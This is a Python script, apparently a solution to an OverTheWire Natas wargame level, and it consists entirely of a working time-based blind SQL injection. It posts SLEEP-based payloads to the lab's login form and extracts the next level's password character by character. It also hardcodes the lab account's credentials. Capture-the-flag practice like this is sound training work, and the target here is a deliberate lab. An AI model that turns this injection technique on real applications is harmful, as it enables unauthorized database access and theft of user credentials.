#!/usr/bin/python3

import requests, sys
from string import digits, ascii_lowercase, ascii_uppercase

charset = ascii_lowercase + ascii_uppercase + digits
url = "http://natas17.natas.labs.overthewire.org/"
sqli = 'natas18" AND password LIKE BINARY "'
sqli2 = '" AND SLEEP(5)-- -'

s = requests.Session()
s.auth = ('natas17', '8Ps3H0GWbn5rd9S7GmAdgQNdkhPkq9cw')

password = ""
while len(password) < 32:
    for char in charset:
        try:
            payload = {'username': sqli + password + char + "%" + sqli2}
            r = s.post(url, data=payload, timeout=1)

        except requests.Timeout:
            sys.stdout.write(char)
            sys.stdout.flush()
            password += char
            break